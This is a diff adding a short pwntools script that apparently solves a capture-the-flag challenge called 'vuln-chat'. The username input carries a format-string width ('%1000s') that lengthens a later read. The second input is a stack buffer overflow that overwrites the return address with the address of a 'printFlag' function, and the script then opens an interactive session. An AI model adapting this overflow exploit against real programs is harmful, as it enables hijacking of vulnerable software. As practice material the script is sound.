@@ -1,0 +1,23 @@
+from pwn import *
+
+p = process("./vuln-chat")
+'''
+p = gdb.debug("./vuln-chat", gdbscript = 
+break *main
+r
+)
+'''
+
+e = ELF("./vuln-chat")
+
+win = e.symbols['printFlag'] + 1
+print(hex(win))
+
+payload = b"A" * 20 + str("%1000s").encode() 
+p.sendlineafter(b"username: ", payload)
+
+payload = b"A" * 0x2D + b"B" * 4 + p32(win)
+p.sendlineafter(b"you?\n", payload)
+
+p.interactive()
+
